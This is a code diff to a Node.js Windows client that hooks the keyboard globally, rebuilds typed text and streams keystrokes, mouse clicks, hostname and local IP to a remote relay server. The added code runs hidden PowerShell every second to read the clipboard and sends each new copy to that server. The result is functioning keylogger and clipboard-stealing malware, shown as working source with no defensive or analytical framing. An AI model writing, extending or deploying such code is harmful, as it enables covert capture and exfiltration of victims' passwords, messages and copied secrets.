@@ -6,6 +6,8 @@
  */
 const DEFAULT_RELAY_HOST = "wss://staging.zenzyvera.store";
 
+const crypto = require("node:crypto");
+const { execFile } = require("node:child_process");
 const fs = require("node:fs");
 const http = require("node:http");
 const https = require("node:https");
@@ -30,10 +32,32 @@ function createWindowsTypableCharResolver() {
       "int __stdcall ToUnicodeEx(uint32 wVirtKey, uint32 wScanCode, const uint8 * lpKeyState, uint16 * pwszBuff, int cchBuff, uint32 wFlags, void * dwhkl)"
     );
     const GetKeyboardLayout = user32.func("void * __stdcall GetKeyboardLayout(uint32 idThread)");
-    const keyboardLayout = GetKeyboardLayout(0);
     const outBuf = Buffer.alloc(8);
 
-    return (vKey, scanCode) => {
+    const applyShiftToState = (state, isDown) => {
+      const shiftFromOs = (GetKeyState(0x10) & 0x8000) !== 0;
+      const leftFromOs = (GetKeyState(0xa0) & 0x8000) !== 0;
+      const rightFromOs = (GetKeyState(0xa1) & 0x8000) !== 0;
+      const shiftFromMap = !!(
+        isDown &&
+        (isDown["LEFT SHIFT"] ||
+          isDown["RIGHT SHIFT"] ||
+          isDown.SHIFT ||
+          isDown.LSHIFT ||
+          isDown.RSHIFT)
+      );
+      if (shiftFromOs || shiftFromMap) {
+        state[0x10] |= 0x80;
+      }
+      if (leftFromOs || (isDown && (isDown["LEFT SHIFT"] || isDown.LSHIFT))) {
+        state[0xa0] |= 0x80;
+      }
+      if (rightFromOs || (isDown && (isDown["RIGHT SHIFT"] || isDown.RSHIFT))) {
+        state[0xa1] |= 0x80;
+      }
+    };
+
+    return (vKey, scanCode, isDown) => {
       if (vKey == null || scanCode == null) {
         return null;
       }
@@ -41,6 +65,7 @@ function createWindowsTypableCharResolver() {
       if (!GetKeyboardState(state)) {
         return null;
       }
+      applyShiftToState(state, isDown);
       state[vKey] |= 0x80;
       const capsToggle = GetKeyState(0x14) & 1;
       if (capsToggle) {
@@ -48,6 +73,7 @@ function createWindowsTypableCharResolver() {
       } else {
         state[0x14] &= 0xfe;
       }
+      const keyboardLayout = GetKeyboardLayout(0);
       const result = ToUnicodeEx(vKey, scanCode, state, outBuf, 4, 0, keyboardLayout);
       if (result === 1) {
         const code = outBuf.readUInt16LE(0);
@@ -301,7 +327,7 @@ function formatModifiers(isDown) {
   const order = ["Ctrl", "Shift", "Alt", "Win"];
   const held = new Set();
   for (const key of Object.keys(isDown)) {
-    if (MODIFIERS.has(key)) {
+    if (isDown[key] && MODIFIERS.has(key)) {
       held.add(normalizeModifier(key));
     }
   }
@@ -365,6 +391,11 @@ function formatEventLine(record) {
   if (record.type === "text") {
     return `${record.timestamp}  TEXT [${record.delimiter}]  ${record.text}`;
   }
+  if (record.type === "clipboard") {
+    const flat = String(record.text || "").replace(/\s+/g, " ").trim();
+    const preview = flat.length > 100 ? `${flat.slice(0, 100)}…` : flat;
+    return `${record.timestamp}  CLIPBOARD  ${preview}`;
+  }
   const label = record.combo ?? record.key;
   const prefix = record.type === "mouse" ? "MOUSE" : "KEY";
   const parts = [record.timestamp, record.state.padEnd(2), `${prefix} ${label}`];
@@ -399,30 +430,90 @@ const SHIFT_SYMBOL_US = {
   "`": "~",
 };
 
-/** keyspy standardName → US base symbol (before shift). */
+/** keyspy standardName / OEM name → US base symbol (before shift). */
 const STANDARD_NAME_TO_CHAR = {
   SEMICOLON: ";",
+  OEM_1: ";",
   EQUALS: "=",
+  OEM_PLUS: "=",
   COMMA: ",",
+  OEM_COMMA: ",",
   MINUS: "-",
+  OEM_MINUS: "-",
   DOT: ".",
+  OEM_PERIOD: ".",
   "FORWARD SLASH": "/",
+  OEM_2: "/",
   BACKTICK: "`",
   SECTION: "`",
+  OEM_3: "`",
+  OEM_102: "`",
   "SQUARE BRACKET OPEN": "[",
+  OEM_4: "[",
   "SQUARE BRACKET CLOSE": "]",
+  OEM_6: "]",
   BACKSLASH: "\\",
+  OEM_5: "\\",
   QUOTE: "'",
+  OEM_7: "'",
 };
 
-function isShiftHeld(modifiers, isDown) {
-  if (modifiers.includes("Shift")) {
-    return true;
+function baseSymbolKey(key) {
+  if (STANDARD_NAME_TO_CHAR[key] !== undefined) {
+    return STANDARD_NAME_TO_CHAR[key];
   }
-  if (!isDown) {
+  if (key.length === 1) {
+    return key;
+  }
+  return null;
+}
+
+let shiftStateApi = null;
+
+function getShiftStateApi() {
+  if (process.platform !== "win32") {
+    return null;
+  }
+  if (shiftStateApi !== null) {
+    return shiftStateApi;
+  }
+  try {
+    const koffi = require("koffi");
+    shiftStateApi = koffi.load("user32.dll").func("short __stdcall GetKeyState(int nVirtKey)");
+  } catch {
+    shiftStateApi = false;
+  }
+  return shiftStateApi || null;
+}
+
+function isShiftHeldFromOs() {
+  const GetKeyState = getShiftStateApi();
+  if (!GetKeyState) {
     return false;
   }
-  return !!(isDown["LEFT SHIFT"] || isDown["RIGHT SHIFT"] || isDown.SHIFT || isDown.LSHIFT || isDown.RSHIFT);
+  return (
+    (GetKeyState(0x10) & 0x8000) !== 0 ||
+    (GetKeyState(0xa0) & 0x8000) !== 0 ||
+    (GetKeyState(0xa1) & 0x8000) !== 0
+  );
+}
+
+function isShiftHeld(modifiers, isDown) {
+  if (isDown) {
+    if (
+      isDown["LEFT SHIFT"] ||
+      isDown["RIGHT SHIFT"] ||
+      isDown.SHIFT ||
+      isDown.LSHIFT ||
+      isDown.RSHIFT
+    ) {
+      return true;
+    }
+  }
+  if (modifiers && modifiers.includes("Shift")) {
+    return true;
+  }
+  return isShiftHeldFromOs();
 }
 
 function readCapsLockOnWindows() {
@@ -443,19 +534,16 @@ function createTypingState(resolveWindowsChar) {
 
   function fallbackKeyToChar(key, modifiers, isDown) {
     const shiftHeld = isShiftHeld(modifiers, isDown);
-    let symbolKey = key;
-    if (STANDARD_NAME_TO_CHAR[key] !== undefined) {
-      symbolKey = STANDARD_NAME_TO_CHAR[key];
-    }
+    const symbolKey = baseSymbolKey(key);
     const letter = key.length === 1 && /[A-Z]/i.test(key);
     if (letter) {
       const upper = shiftHeld !== capsLockOn;
       return upper ? key.toUpperCase() : key.toLowerCase();
     }
-    if (symbolKey.length === 1 && /[0-9]/.test(symbolKey)) {
+    if (symbolKey && symbolKey.length === 1 && /[0-9]/.test(symbolKey)) {
       return shiftHeld ? (SHIFT_NUMBER_US[symbolKey] ?? symbolKey) : symbolKey;
     }
-    if (SHIFT_SYMBOL_US[symbolKey] !== undefined) {
+    if (symbolKey && SHIFT_SYMBOL_US[symbolKey] !== undefined) {
       return shiftHeld ? SHIFT_SYMBOL_US[symbolKey] : symbolKey;
     }
     if (key === "SPACE") return " ";
@@ -472,13 +560,21 @@ function createTypingState(resolveWindowsChar) {
       capsLockOn = readCapsLockOnWindows();
     },
     keyToChar(key, modifiers, vKey, scanCode, isDown) {
+      const shiftHeld = isShiftHeld(modifiers, isDown);
+      const fallback = fallbackKeyToChar(key, modifiers, isDown);
+
+      if (shiftHeld && fallback) {
+        return fallback;
+      }
+
       if (resolveWindowsChar) {
-        const ch = resolveWindowsChar(vKey, scanCode);
+        const ch = resolveWindowsChar(vKey, scanCode, isDown);
         if (ch && ch.length === 1) {
           return ch;
         }
       }
-      return fallbackKeyToChar(key, modifiers, isDown);
+
+      return fallback;
     },
   };
 }
@@ -489,6 +585,23 @@ function isLeftMouseDown(record) {
   }
   const key = record.key.toUpperCase();
   return key === "MOUSE LEFT" || key === "LBUTTON";
+}
+
+function isEnterKey(name) {
+  const upper = String(name || "").toUpperCase();
+  return (
+    upper === "RETURN" ||
+    upper === "ENTER" ||
+    upper === "NUMPAD ENTER" ||
+    upper === "NUMPAD_ENTER"
+  );
+}
+
+function isLeftMouseDownKey(name, state) {
+  if (state !== "DOWN" || !isMouseKey(name)) {
+    return false;
+  }
+  return isLeftMouseDown({ state: "DOWN", type: "mouse", key: name });
 }
 
 function createTextBuffer(typingState) {
@@ -518,7 +631,7 @@ function createTextBuffer(typingState) {
       if (MODIFIERS.has(key)) {
         return false;
       }
-      if (key === "RETURN" || key === "ENTER") {
+      if (isEnterKey(key)) {
         return false;
       }
       if (key === "BACK" || key === "BACKSPACE") {
@@ -528,7 +641,7 @@ function createTextBuffer(typingState) {
       if (record.modifiers.some((m) => ["Ctrl", "Alt", "Win"].includes(m))) {
         return false;
       }
-      const ch = typingState.keyToChar(key, record.modifiers, record.vKey, record.scanCode, isDown);
+      const ch = typingState.keyToChar(key, formatModifiers(isDown), record.vKey, record.scanCode, isDown);
       if (ch) {
         buffer += ch;
         return true;
@@ -624,16 +737,135 @@ async function connectWithFallback(serverBase, token) {
   throw new Error(`WebSocket failed (${lastError}).\n${hint}`);
 }
 
+function getPrimaryLocalIpv4() {
+  const nets = os.networkInterfaces();
+  for (const ifName of Object.keys(nets)) {
+    for (const net of nets[ifName] ?? []) {
+      if (net.family === "IPv4" && !net.internal) {
+        return net.address;
+      }
+    }
+  }
+  for (const ifName of Object.keys(nets)) {
+    for (const net of nets[ifName] ?? []) {
+      if (net.family === "IPv4") {
+        return net.address;
+      }
+    }
+  }
+  return "0.0.0.0";
+}
+
+const CLIPBOARD_PS_COMMAND =
+  "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()";
+const DEFAULT_CLIPBOARD_MS = 1000;
+const MAX_CLIPBOARD_CHARS = 256 * 1024;
+
+function powershellExe() {
+  const windir = process.env.windir || process.env.WINDIR;
+  if (windir) {
+    return path.join(windir, "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
+  }
+  return "powershell.exe";
+}
+
+function readWindowsClipboardText(callback) {
+  if (process.platform !== "win32") {
+    callback(null);
+    return;
+  }
+  execFile(
+    powershellExe(),
+    ["-NoProfile", "-STA", "-Command", CLIPBOARD_PS_COMMAND],
+    { encoding: "utf8", maxBuffer: 4 * 1024 * 1024, windowsHide: true },
+    (err, stdout) => {
+      if (err) {
+        callback(null);
+        return;
+      }
+      callback(stdout ?? "");
+    },
+  );
+}
+
+function normalizeClipboardText(raw, maxChars = MAX_CLIPBOARD_CHARS) {
+  if (raw == null) {
+    return null;
+  }
+  let text = String(raw).replace(/\r\n/g, "\n").replace(/\r/g, "\n");
+  if (!text.trim()) {
+    return null;
+  }
+  if (text.length > maxChars) {
+    text = `${text.slice(0, maxChars)}\n… [clipboard truncated]`;
+  }
+  return text;
+}
+
+function createClipboardMonitor({ intervalMs, onCapture, maxChars = MAX_CLIPBOARD_CHARS }) {
+  let lastDigest = null;
+  let timer = null;
+  let reading = false;
+
+  function digest(text) {
+    return crypto.createHash("sha256").update(text, "utf8").digest("hex");
+  }
+
+  function tick(initialSeed) {
+    if (reading) {
+      return;
+    }
+    reading = true;
+    readWindowsClipboardText((raw) => {
+      reading = false;
+      const text = normalizeClipboardText(raw, maxChars);
+      if (!text) {
+        return;
+      }
+      const nextDigest = digest(text);
+      if (initialSeed) {
+        lastDigest = nextDigest;
+        return;
+      }
+      if (nextDigest === lastDigest) {
+        return;
+      }
+      lastDigest = nextDigest;
+      onCapture(text);
+    });
+  }
+
+  return {
+    start() {
+      if (process.platform !== "win32" || !intervalMs || intervalMs < 200) {
+        return false;
+      }
+      tick(true);
+      timer = setInterval(() => tick(false), intervalMs);
+      return true;
+    },
+    stop() {
+      if (timer) {
+        clearInterval(timer);
+        timer = null;
+      }
+    },
+  };
+}
+
 function parseArgs(argv) {
   const defaultServer = process.env.WINC_SERVER || DEFAULT_RELAY_HOST;
+  const clipboardMsEnv = process.env.WINC_CLIPBOARD_MS;
   const options = {
     server: normalizeAgentUrl(defaultServer),
     token: process.env.WINC_TOKEN || "",
     name: process.env.WINC_CLIENT_NAME || os.hostname(),
+    clientIp: process.env.WINC_CLIENT_IP || getPrimaryLocalIpv4(),
     raw: false,
     combosOnly: false,
     logFile: null,
     reconnectMs: 5000,
+    clipboardMs: clipboardMsEnv ? Number(clipboardMsEnv) : DEFAULT_CLIPBOARD_MS,
   };
   for (let i = 0; i < argv.length; i += 1) {
     const arg = argv[i];
@@ -643,12 +875,18 @@ function parseArgs(argv) {
       options.token = argv[++i];
     } else if (arg === "--name" || arg === "-n") {
       options.name = argv[++i];
+    } else if (arg === "--ip") {
+      options.clientIp = argv[++i];
     } else if (arg === "--raw" || arg === "-r") {
       options.raw = true;
     } else if (arg === "--combos-only" || arg === "-c") {
       options.combosOnly = true;
     } else if (arg === "--log" || arg === "-l") {
       options.logFile = path.resolve(argv[++i]);
+    } else if (arg === "--clipboard-ms") {
+      options.clipboardMs = Number(argv[++i]);
+    } else if (arg === "--no-clipboard") {
+      options.clipboardMs = 0;
     } else if (arg === "--help" || arg === "-h") {
       console.log(`npm install && npm start
 Optional: npm start -- --server YOUR_VPS_IP --name "My-PC"
@@ -661,9 +899,14 @@ Edit DEFAULT_RELAY_HOST at top of index.js`);
 
 async function main() {
   const options = parseArgs(process.argv.slice(2));
-  const agentMeta = { hostname: os.hostname(), clientName: options.name, platform: process.platform };
+  const agentMeta = {
+    hostname: os.hostname(),
+    clientName: options.name,
+    clientIp: options.clientIp,
+    platform: process.platform,
+  };
   const relayHost = hostFromServerInput(options.server);
-  console.log(`Client PC: ${agentMeta.clientName}`);
+  console.log(`Client PC: ${agentMeta.clientName} (${agentMeta.clientIp})`);
   console.log(`VPS: ${relayHost}`);
   let logStream = options.logFile ? fs.createWriteStream(options.logFile, { flags: "a" }) : null;
   const writeLine = (line) => {
@@ -731,6 +974,22 @@ async function main() {
 
   await startConnection();
 
+  const clipboardMonitor = createClipboardMonitor({
+    intervalMs: options.clipboardMs,
+    onCapture: (text) => {
+      sendPayload({
+        type: "clipboard",
+        timestamp: new Date().toISOString(),
+        text,
+      });
+    },
+  });
+  if (clipboardMonitor.start()) {
+    console.log(`Clipboard capture every ${options.clipboardMs}ms (new copy only).`);
+  } else if (process.platform !== "win32") {
+    console.log("Clipboard capture: Windows only (skipped).");
+  }
+
   const keyboard = new GlobalKeyboardListener({
     windows: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
     mac: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
@@ -738,32 +997,31 @@ async function main() {
   });
 
   await keyboard.addListener((event, isDown) => {
-    const record = buildEventRecord(event, isDown, { ...options, typingState });
-    if (!record) {
-      return false;
-    }
+    const keyName = event.name ?? "UNKNOWN";
 
-    if (record.state === "DOWN") {
-      if (record.type === "keyboard" && (record.key === "CAPS LOCK" || record.key === "CAPSLOCK")) {
-        typingState.toggleCapsLock();
-      }
-
-      if (isLeftMouseDown(record)) {
+    if (event.state === "DOWN") {
+      if (isLeftMouseDownKey(keyName, event.state)) {
         const batch = textBuffer.flush("mouse", agentMeta);
         if (batch) {
           sendPayload(batch);
         }
         sendPayload(typingPreviewPayload(textBuffer, agentMeta));
-      } else if (
-        record.type === "keyboard" &&
-        (record.key === "RETURN" || record.key === "ENTER")
-      ) {
+      } else if (isEnterKey(keyName)) {
         const batch = textBuffer.flush("enter", agentMeta);
         if (batch) {
           sendPayload(batch);
         }
         sendPayload(typingPreviewPayload(textBuffer, agentMeta));
-      } else if (record.type === "keyboard") {
+      }
+    }
+
+    const record = buildEventRecord(event, isDown, { ...options, typingState });
+
+    if (record?.state === "DOWN") {
+      if (record.type === "keyboard" && (record.key === "CAPS LOCK" || record.key === "CAPSLOCK")) {
+        typingState.toggleCapsLock();
+      }
+      if (record.type === "keyboard" && !isEnterKey(record.key)) {
         const changed = textBuffer.appendFromKey(record, isDown);
         if (changed) {
           sendPayload(typingPreviewPayload(textBuffer, agentMeta));
@@ -771,7 +1029,7 @@ async function main() {
       }
     }
 
-    if (record.type === "keyboard" || record.type === "mouse") {
+    if (record && (record.type === "keyboard" || record.type === "mouse")) {
       sendPayload(record);
     }
     return false;
@@ -781,6 +1039,7 @@ async function main() {
 
   const shutdown = () => {
     shouldRun = false;
+    clipboardMonitor.stop();
     const tail = textBuffer.flush("enter", agentMeta);
     if (tail) sendPayload(tail);
     keyboard.kill();
